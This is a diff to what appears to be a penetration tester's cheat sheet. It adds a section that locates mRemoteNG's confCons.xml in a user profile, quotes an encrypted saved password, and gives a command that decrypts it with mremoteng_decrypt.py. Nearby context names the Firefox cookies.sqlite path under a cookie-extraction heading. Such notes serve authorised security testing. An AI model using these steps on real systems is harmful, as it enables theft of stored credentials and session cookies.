@@ -5,6 +5,15 @@ $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\Curr
 $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
 ```
 
+# mRemoteNG
+```powershell
+C:\Users\julio\AppData\Roaming\mRemoteNG
+confCons.xml:
+Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig=="
+
+python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 
+```
+
 # Firefox Cookie Extraction
 ```powershell
 Firefox: C:\Users\<Sizin_İstifadəçi_Adınız>\AppData\Roaming\Mozilla\Firefox\Profiles\<təsadüfi_simvollar>.default-release\cookies.sqlite
